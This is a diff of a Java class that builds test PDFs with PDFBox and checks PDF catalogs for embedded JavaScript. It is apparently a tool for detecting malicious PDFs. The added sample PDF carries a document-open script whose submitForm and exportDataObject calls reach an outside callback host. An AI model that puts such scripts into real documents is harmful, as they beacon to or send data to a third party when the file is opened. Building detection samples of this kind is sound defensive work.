@@ -1,7 +1,6 @@
 package cn.moonlord.common.pdf;
 
-import org.apache.pdfbox.cos.COSBase;
-import org.apache.pdfbox.cos.COSDictionary;
+import org.apache.pdfbox.cos.COSName;
 import org.apache.pdfbox.pdmodel.PDDocument;
 import org.apache.pdfbox.pdmodel.PDDocumentCatalog;
 import org.apache.pdfbox.pdmodel.PDPage;
@@ -18,14 +17,15 @@ public class PdfXss {
         try {
             new File((new File(fileSavePath)).getParent()).mkdirs();
             PDDocument document = new PDDocument();
-            document.save(fileSavePath);
             PDPage page = new PDPage();
             PDPageContentStream content = new PDPageContentStream(document, page);
             content.beginText();
-            content.setFont(PDType1Font.TIMES_ROMAN, 16);
-            content.showText("COSName{JavaScript}");
+            content.setFont(PDType1Font.TIMES_ROMAN, 14);
+            content.showText("COSName{S}:COSName{JavaScript};COSName{JS}:COSString{ ... }");
             content.endText();
+            content.close();
             document.addPage(page);
+            document.save(fileSavePath);
             document.close();
         } catch (IOException e) {
             throw new IllegalArgumentException(e);
@@ -36,7 +36,11 @@ public class PdfXss {
         try {
             new File((new File(fileSavePath)).getParent()).mkdirs();
             PDDocument document = new PDDocument();
-            String javaScript = "app.alert( {cMsg: 'this is an example', nIcon: 3, nType: 0, cTitle: 'PDFBox Javascript example' } );";
+            PDPage page = new PDPage();
+            document.addPage(page);
+            String javaScript = "app.alert( {cMsg: 'this is an example', nIcon: 3, nType: 0, cTitle: 'PDFBox Javascript example' } );\n" +
+                "this.submitForm({ cURL: \"http://c3aae62fc7.ipv6.1433.eu.org\" });\n" +
+                "this.exportDataObject({ cName: \"exportData\", nLaunch: 2, cDIPath: \"http://c3aae62fc7.ipv6.1433.eu.org\" });\n";
             PDActionJavaScript action = new PDActionJavaScript(javaScript);
             document.getDocumentCatalog().setOpenAction(action);
             document.save(fileSavePath);
@@ -50,14 +54,10 @@ public class PdfXss {
         try {
             PDDocument document = PDDocument.load(new File(fileSavePath));
             PDDocumentCatalog pdDocumentCatalog = document.getDocumentCatalog();
-            COSDictionary root = pdDocumentCatalog.getCOSObject();
-            if (root == null) {
-                return false;
-            }
-            if(root.toString().contains("COSName{JavaScript}")){
-                // return true;
-            }
-            for (COSBase value: root.getValues()) {
+            String catalog = pdDocumentCatalog.getCOSObject().toString();
+            // check: COSName{S}:COSName{JavaScript};COSName{JS}:COSString{ ... }:
+            if (catalog.contains(COSName.JAVA_SCRIPT.toString()) || catalog.contains(COSName.JS.toString())) {
+                return true;
             }
         } catch (IOException e) {
             throw new IllegalArgumentException(e);
